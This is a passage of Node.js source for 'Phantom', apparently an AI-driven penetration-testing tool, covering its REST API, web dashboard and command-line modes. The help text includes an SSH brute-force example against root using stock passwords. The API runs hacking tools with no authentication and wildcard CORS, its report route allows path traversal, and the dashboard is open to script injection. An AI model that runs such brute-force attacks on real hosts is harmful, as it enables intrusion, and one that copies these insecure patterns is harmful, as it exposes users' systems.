  try {
    return new ConversationalUI(am);
  } catch (err) {
    console.error(`${D}Conversational UI unavailable, falling back: ${err.message}${R}`);
    return new TermuxUI(am);
  }
}

// ── GUI Dashboard ──────────────────────────────────────────
// ── REST API Handler ──────────────────────────────────────
async function handleApiRequest(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return true; }
  const url = new URL(req.url || '/', 'http://' + (req.headers.host || 'localhost'));
  const json = (data, code = 200) => { res.writeHead(code, { 'Content-Type': 'application/json' }); res.end(JSON.stringify(data)); };
  const body = () => new Promise(r => { let b = ''; req.on('data', c => b += c); req.on('end', () => r(JSON.parse(b))); });
  try {
    // GET /api — list all
    if (url.pathname === '/api' || url.pathname === '/api/') {
      return json({ ok: true, tools: Object.keys(hackerTools).sort(), version: '0.2.0', docs: '/api/tools, /api/run, /api/info, /api/playbooks, /api/reports' });
    }
    // GET /api/tools — list tool names
    if (url.pathname === '/api/tools') {
      return json({ ok: true, count: Object.keys(hackerTools).length, tools: Object.keys(hackerTools).sort() });
    }
    // GET /api/info — detailed tool info
    if (url.pathname === '/api/info') {
      const entries = Object.entries(hackerTools).sort(([a], [b]) => a < b ? -1 : 1).map(([name]) => ({ name }));
      return json({ ok: true, count: entries.length, tools: entries });
    }
    // GET /api/tool/:name — tool metadata
    const toolMatch = url.pathname.match(/^\/api\/tool\/(.+)$/);
    if (toolMatch) {
      const name = decodeURIComponent(toolMatch[1]);
      if (!hackerTools[name]) return json({ ok: false, error: 'Tool not found' }, 404);
      return json({ ok: true, name });
    }
    // POST /api/run — execute tool
    if (url.pathname === '/api/run' && req.method === 'POST') {
      const { tool, args } = await body();
      if (!tool || !hackerTools[tool]) return json({ ok: false, error: `Tool "${tool}" not found` }, 404);
      const result = await hackerTools[tool](args || '');
      return json({ ok: true, tool, args: args || '', result });
    }
    // GET /api/run?tool=...&args=... — execute via GET
    if (url.pathname === '/api/run' && req.method === 'GET') {
      const tool = url.searchParams.get('tool');
      const args = url.searchParams.get('args') || '';
      if (!tool || !hackerTools[tool]) return json({ ok: false, error: `Tool "${tool}" not found` }, 404);
      const result = await hackerTools[tool](args);
      return json({ ok: true, tool, args, result });
    }
    // GET /api/playbooks — list playbooks
    if (url.pathname === '/api/playbooks') {
      const pbDir = resolve(homedir(), '.config', 'phantom', 'playbooks');
      const names = [];
      if (fs.existsSync(pbDir)) {
        for (const f of fs.readdirSync(pbDir).filter(f => f.endsWith('.json'))) {
          const pb = JSON.parse(fs.readFileSync(resolve(pbDir, f), 'utf-8'));
          names.push({ name: pb.name, description: pb.description, steps: (pb.steps||[]).length, vars: pb.variables });
        }
      }
      return json({ ok: true, playbooks: names });
    }
    // POST /api/playbook/run — run a playbook
    if (url.pathname === '/api/playbook/run' && req.method === 'POST') {
      const { name, vars } = await body();
      if (!hackerTools.playbook_run) return json({ ok: false, error: 'playbook_run tool not loaded' }, 404);
      const result = await hackerTools.playbook_run(vars ? name + '|' + vars : name);
      return json({ ok: true, name, result });
    }
    // GET /api/playbook/run?name=...&vars=... — run via GET
    if (url.pathname === '/api/playbook/run' && req.method === 'GET') {
      const name = url.searchParams.get('name');
      const vars = url.searchParams.get('vars') || '';
      if (!name) return json({ ok: false, error: '?name= required' }, 400);
      if (!hackerTools.playbook_run) return json({ ok: false, error: 'playbook_run not loaded' }, 404);
      const result = await hackerTools.playbook_run(vars ? name + '|' + vars : name);
      return json({ ok: true, name, result });
    }
    // GET /api/reports — list reports
    if (url.pathname === '/api/reports') {
      const reports = [];
      if (fs.existsSync(REPORTS_DIR)) {
        for (const f of fs.readdirSync(REPORTS_DIR).filter(f => f.endsWith('.md') || f.endsWith('.txt'))) {
          const s = fs.readFileSync(resolve(REPORTS_DIR, f)).length;
          reports.push({ name: f, size: s < 1024 ? s + 'B' : (s/1024).toFixed(1) + 'KB' });
        }
      }
      return json({ ok: true, reports });
    }
    // GET /api/report/:name — view a report
    if (url.pathname.startsWith('/api/report/')) {
      const name = decodeURIComponent(url.pathname.slice(12));
      const fp = resolve(REPORTS_DIR, name);
      if (!fs.existsSync(fp)) return json({ ok: false, error: 'Report not found' }, 404);
      return json({ ok: true, name, content: fs.readFileSync(fp, 'utf-8') });
    }
    // GET /api/health — health check
    if (url.pathname === '/api/health') {
      return json({ ok: true, status: 'running', tools: Object.keys(hackerTools).length, pid: process.pid, uptime: process.uptime().toFixed(0) + 's' });
    }
    return json({ ok: false, error: 'Not found' }, 404);
  } catch (e) { return json({ ok: false, error: e.message }, 500); }
}

function startApiServer(port) {
  const server = http.createServer((req, res) => handleApiRequest(req, res));
  server.listen(port, () => console.log(`  🌐 Phantom API: http://localhost:${port}  (--api)`));
}

function startGuiDashboard(port) {
  const REPORTS = resolve(homedir(), '.config', 'phantom', 'reports');
  const HTML = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Phantom Dashboard</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;color:#c8d6e5;font-family:'Cascadia Code','Fira Code','JetBrains Mono',monospace;font-size:13px;min-height:100vh}
header{background:linear-gradient(135deg,#0f0f1a,#1a1a2e);border-bottom:1px solid #00ff8844;padding:12px 20px;display:flex;justify-content:space-between}
header h1{color:#00ff88;font-size:18px;letter-spacing:1px}
.tabs{display:flex;background:#0f0f1a;border-bottom:1px solid #1a1a2e;padding:0 20px}
.tab{padding:10px 20px;cursor:pointer;color:#5a6a7a;border-bottom:2px solid transparent;transition:.2s;font-size:12px}
.tab:hover,.tab.active{color:#00ff88;border-bottom-color:#00ff88}
.content{padding:16px 20px;display:none}.content.active{display:block}
.search-box{width:100%;padding:8px 12px;background:#0f0f1a;border:1px solid #1a1a2e;border-radius:4px;color:#c8d6e5;font-family:inherit;font-size:12px;margin-bottom:16px;outline:none}
.tool-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:8px}
.tool-card{background:#0f0f1a;border:1px solid #1a1a2e;border-radius:4px;padding:10px 12px;cursor:pointer;transition:.2s}
.tool-card:hover{border-color:#00ff8844;background:#12122a}
.tool-card .name{color:#00ff88;font-size:12px;font-weight:700}
.tool-detail{display:none;margin-top:8px}.tool-detail.open{display:block}
.tool-detail input{width:100%;padding:6px 10px;background:#05050a;border:1px solid #1a2a1a;border-radius:3px;color:#c8d6e5;font-family:inherit;font-size:12px;margin-bottom:6px;outline:none}
.tool-detail button,.playbook-detail button{background:#00ff8822;color:#00ff88;border:1px solid #00ff8844;padding:4px 14px;border-radius:3px;cursor:pointer;font-family:inherit;font-size:11px}
.tool-detail button:hover{background:#00ff8844}
.output{background:#05050a;border:1px solid #1a1a2e;border-radius:4px;padding:12px;margin-top:12px;max-height:400px;overflow:auto;font-size:11px;white-space:pre-wrap;display:none}
.output.show{display:block}.output .prompt{color:#00ff8844}
.playbook-item,.report-item{background:#0f0f1a;border:1px solid #1a1a2e;border-radius:4px;padding:12px;margin-bottom:8px;cursor:pointer}
.playbook-item:hover,.report-item:hover{border-color:#ffaa0044}
.playbook-item .name{color:#ffaa00;font-size:13px}
.playbook-item .desc,.report-item .name{color:#5a6a7a;font-size:11px}
.playbook-detail{display:none;margin-top:8px;padding:8px;background:#05050a;border-radius:3px}
.playbook-detail.open{display:block}
.playbook-detail input{width:100%;padding:6px 10px;background:#05050a;border:1px solid #3a2a00;border-radius:3px;color:#c8d6e5;font-family:inherit;font-size:12px;margin:4px 0;outline:none}
.report-item .size{color:#3a4a5a;font-size:10px;margin-left:8px}
#reportViewer{display:none;background:#05050a;border:1px solid #1a1a2e;border-radius:4px;padding:16px;margin-top:8px;max-height:500px;overflow:auto;white-space:pre-wrap;font-size:11px}
#reportViewer.show{display:block}
.loading,.error{color:#5a6a7a;text-align:center;padding:20px;font-size:12px}
.status-bar{background:#0f0f1a;border-top:1px solid #1a1a2e;padding:6px 20px;font-size:10px;color:#3a4a5a;display:flex;justify-content:space-between}
::-webkit-scrollbar{width:4px;background:#0a0a0f}::-webkit-scrollbar-thumb{background:#1a1a2e;border-radius:2px}
@media(max-width:600px){.tool-grid{grid-template-columns:repeat(auto-fill,minmax(140px,1fr))}}
</style></head><body>
<header><h1>🔮 PHANTOM</h1><span id="status">● localhost:${port}</span></header>
<div class="tabs"><div class="tab active" onclick="switchTab('tools')">🛠 Tools</div><div class="tab" onclick="switchTab('playbooks')">📋 Playbooks</div><div class="tab" onclick="switchTab('reports')">📄 Reports</div></div>
<div id="tools" class="content active"><input class="search-box" id="search" placeholder="Search tools..." oninput="filter(this.value)"><div class="tool-grid" id="grid"><div class="loading">Loading...</div></div><div id="output" class="output"></div></div>
<div id="playbooks" class="content"><div id="pbList"><div class="loading">Loading...</div></div></div>
<div id="reports" class="content"><div id="rptList"><div class="loading">Loading...</div></div><div id="reportViewer"></div></div>
<div class="status-bar"><span id="tcount">—</span><span>● connected</span></div>
<script>
const B='';let tools=[];
async function api(p,o){const r=await fetch(B+p,o);if(!r.ok)throw new Error(r.statusText);return r.json()}
async function loadTools(){try{tools=await api('/api/tools');document.getElementById('tcount').textContent=tools.length+' tools';render(tools)}catch(e){document.getElementById('grid').innerHTML='<div class=error>'+e.message+'</div>'}}
function render(n){document.getElementById('grid').innerHTML=n.map((t,i)=>'<div class=tool-card onclick="td('+i+')"><div class=name>@'+t+'</div><div class=tool-detail id=td'+i+'><input id=in'+i+' placeholder=Args... onkeydown="if(event.key===\\'Enter\\')run(t,'+i+')"><button onclick="run(\\''+t+'\\','+i+')">▶ Run</button></div></div>').join('')}
function td(i){document.getElementById('td'+i).classList.toggle('open')}
async function run(t,i){const v=document.getElementById('in'+i).value;const o=document.getElementById('output');o.classList.add('show');o.innerHTML+='<span class=prompt>$</span> @'+t+'|'+v+'\\n';o.scrollTop=o.scrollHeight;try{const r=await api('/api/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:t,args:v})});o.innerHTML+=r.result+'\\n\\n'}catch(e){o.innerHTML+='<span class=error>[Error] '+e.message+'</span>\\n\\n'}o.scrollTop=o.scrollHeight}
function filter(q){document.querySelectorAll('.tool-card').forEach((c,i)=>{c.style.display=tools[i].includes(q.toLowerCase())?'':'none'})}
async function loadPb(){try{const l=await api('/api/playbooks');const d=document.getElementById('pbList');if(!l.length){d.innerHTML='<div style=color:#5a6a7a>No playbooks.</div>';return}d.innerHTML=l.map((p,i)=>'<div class=playbook-item onclick="tpb('+i+')"><div class=name>📋 '+p.name+'</div><div class=desc>'+(p.description||'')+' — '+p.steps+' steps</div><div class="playbook-detail" id=pd'+i+'><input id=pv'+i+' placeholder="target=example.com" value=target=><button onclick="rpb(\\''+p.name+'\\','+i+')">▶ Run</button></div></div>').join('')}catch(e){document.getElementById('pbList').innerHTML='<div class=error>'+e.message+'</div>'}}
function tpb(i){document.getElementById('pd'+i).classList.toggle('open')}
async function rpb(n,i){const v=document.getElementById('pv'+i).value;const o=document.getElementById('output');o.classList.add('show');o.innerHTML+='<span class=prompt>$</span> 📋 '+n+'|'+v+'\\n';try{const r=await api('/api/playbook/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:n,vars:v})});o.innerHTML+=r.result+'\\n\\n'}catch(e){o.innerHTML+='<span class=error>'+e.message+'</span>\\n\\n'}o.scrollTop=o.scrollHeight;switchTab('tools')}
async function loadRpt(){try{const l=await api('/api/reports');const d=document.getElementById('rptList');if(!l.length){d.innerHTML='<div style=color:#5a6a7a>No reports.</div>';return}d.innerHTML=l.map(r=>'<div class=report-item onclick="viewRpt(\\''+r.name+'\\')"><span class=name>📄 '+r.name+'</span><span class=size>'+r.size+'</span></div>').join('')}catch(e){document.getElementById('rptList').innerHTML='<div class=error>'+e.message+'</div>'}}
async function viewRpt(n){try{const r=await api('/api/report/'+encodeURIComponent(n));const v=document.getElementById('reportViewer');v.textContent=r.content;v.classList.add('show')}catch(e){}}
function switchTab(n){document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));document.querySelectorAll('.content').forEach(c=>c.classList.remove('active'));document.querySelector('.tab:nth-child('+(n==='tools'?1:n==='playbooks'?2:3)+')').classList.add('active');document.getElementById(n).classList.add('active');if(n==='playbooks')loadPb();if(n==='reports')loadRpt()}
loadTools();
</script></body></html>`;

  const server = http.createServer((req, res) => {
    if (req.url?.startsWith('/api')) return handleApiRequest(req, res);
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(HTML);
  });
  server.listen(port, () => console.log('\n  🌐 Phantom Dashboard: http://localhost:' + port + '\n'));
}

// ── Main ──────────────────────────────────────────────────
import readline from "readline";

// ── CLI One-Shot Mode ─────────────────────────────────────
const llm = createProvider();
llmInstance = llm;
const args = process.argv.slice(2);
if (args.length > 0 && !args[0].startsWith("--")) {
  // No --flag: pass as interactive input to phantom
} else if (args.length > 0) {
  const flag = args[0].replace("--", "");
  const input = args.slice(1).join(" ") || "";

  if (flag === "help" || flag === "h") {
    console.log(`Phantom — Cybersecurity AI Assistant

Usage:
  phantom                               Conversational REPL (default)
  phantom --recon <domain>              Full recon (7 steps + report)
  phantom --tool <name> <input>         Run one tool directly
  phantom --repl                        Force conversational REPL mode
  phantom --list                        List all tools
  phantom --gui                         Start web dashboard
  phantom --api                         Start REST API server (port 9090)
  phantom --help                        This help

Examples:
  phantom --recon example.com
  phantom --tool port_scan scanme.org
  phantom --tool cve_search "apache 2.4.49"
  phantom --tool bruteforce "ssh|192.168.1.1|root|admin,toor,123"`);
    process.exit(0);
  }

  if (flag === "list" || flag === "l") {
    const names = Object.keys(hackerTools).sort();
    console.log(`Phantom — ${names.length} tools:\n`);
    for (const name of names) {
      const desc = hackerTools[name]?.constructor?.name === "AsyncFunction" || typeof hackerTools[name] === "function"
        ? "(function)" : "—";
      console.log(`  ${name}`);
    }
    process.exit(0);
  }

  if (flag === "repl") {
    // Force conversational REPL mode
    const llm = createProvider();
    llmInstance = llm;
    const am = new AgentManager(llm);
    const ui = new ConversationalUI(am);
    ui.start();
    await new Promise(() => {}); // keep alive
  }

  if (flag === "gui" || flag === "dashboard" || flag === "g") {
    const port = parseInt(process.env.PHANTOM_PORT || '8080');
    startGuiDashboard(port);
    // Keep alive — server is already listening
    await new Promise(() => {}); // never resolves
  }

  if (flag === "api" || flag === "rest") {
    const port = parseInt(process.env.PHANTOM_API_PORT || '9090');
    startApiServer(port);
    await new Promise(() => {}); // keep alive
  }

  if (flag === "tool" || flag === "t") {
    const toolName = args[1];
    const toolInput = args.slice(2).join(" ");
    if (!toolName || !hackerTools[toolName]) {
      console.error(`Unknown tool: "${toolName}". Available: ${Object.keys(hackerTools).sort().join(", ")}`);
      process.exit(1);
    }
    console.log(`🔧 ${toolName} ${toolInput ? `— ${toolInput}` : ""}`);
    const result = await hackerTools[toolName](toolInput || "");
    console.log(result);
    process.exit(0);
  }

  if (flag === "recon" || flag === "r") {
    if (!input) { console.error("Usage: node phantom.mjs --recon <domain>"); process.exit(1); }
    console.log(`🎯 Phantom Recon — ${input}\n`);
    const result = await hackerTools.recon(input);
    console.log(result);
    process.exit(0);
  }

  // Unknown flag — run as tool name directly
  const toolName = flag;
  if (hackerTools[toolName]) {
    console.log(`🔧 ${toolName} ${input ? `— ${input}` : ""}`);
    const result = await hackerTools[toolName](input || "");
    console.log(result);
    process.exit(0);
  }

  console.error(`Unknown flag: --${flag}. Use --help for usage.`);
  process.exit(1);
}

const am = new AgentManager(llm);

// Wait for provider detection before starting UI
const __detection = (async () => {
  try {
    if (ENV.interactive) {
      const avail = await llm.detectProviders();
      const ready = Object.entries(avail).filter(([, v]) => v !== "no").map(([n]) => n);
      if (ready.length > 0) {
        if (!ready.includes(llm.provider)) {
          const best = llm.selectBest(avail);
          if (best) llm.provider = best;
        }
        process.env.PHANTOM_PROVIDERS_READY = ready.join(",");
      } else {
        // No LLM available — offer to set up an API key
        console.log(`\n${c("yellow")}⚠ No LLM provider configured.${R}`);
        console.log(`${D}You can run Ollama locally or set an API key.${R}`);
        const keyProviders = [
          ["openai", "OPENAI_API_KEY", "OpenAI"],
          ["anthropic", "ANTHROPIC_API_KEY", "Anthropic"],
          ["groq", "GROQ_API_KEY", "Groq"],
          ["gemini", "GEMINI_API_KEY", "Google Gemini"],
          ["deepseek", "DEEPSEEK_API_KEY", "DeepSeek"],
          ["mistral", "MISTRAL_API_KEY", "Mistral"],
          ["openrouter", "OPENROUTER_API_KEY", "OpenRouter"],
        ];
        console.log(`\n${B}Set up a provider?${R} (${D}enter number or leave blank to skip${R})`);
        for (let i = 0; i < keyProviders.length; i++) {
          console.log(`  ${i + 1}) ${keyProviders[i][2]}`);
        }
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        const pick = await new Promise(r => rl.question(`\n${c("cyan")}?${R} Choice (1-${keyProviders.length}): `, r));
        rl.close();
        const idx = parseInt(pick) - 1;
        if (idx >= 0 && idx < keyProviders.length) {
          const [, envVar, label] = keyProviders[idx];
          const rl2 = readline.createInterface({ input: process.stdin, output: process.stdout });
          const key = await new Promise(r => rl2.question(`${c("cyan")}🔑${R} Enter ${label} API key: `, r));
          rl2.close();
          if (key.trim()) {
            process.env[envVar] = key.trim();
            _config[envVar] = key.trim();
            try { fs.writeFileSync(resolve(BASE_DIR, "config.json"), JSON.stringify(_config, null, 2)); } catch {}
            console.log(`${c("green")}✓${R} ${label} API key saved to config.json\n`);
            // Re-detect
            const avail2 = await llm.detectProviders();
            const ready2 = Object.entries(avail2).filter(([, v]) => v !== "no").map(([n]) => n);
            if (ready2.length > 0) {
              const best = llm.selectBest(avail2);
              if (best) llm.provider = best;
              process.env.PHANTOM_PROVIDERS_READY = ready2.join(",");
            }
          }
        }
      }
    }
  } catch {}
})();
if (ENV.interactive) await __detection;

const ui = selectUI(am);
ui.start();

process.on("SIGINT", () => process.exit(0));
process.on("SIGTERM", () => process.exit(0));
process.on("exit", () => {
  if (typeof raw !== "undefined") {
    try { process.stdout.write(show); raw(false); } catch {}
  }
});
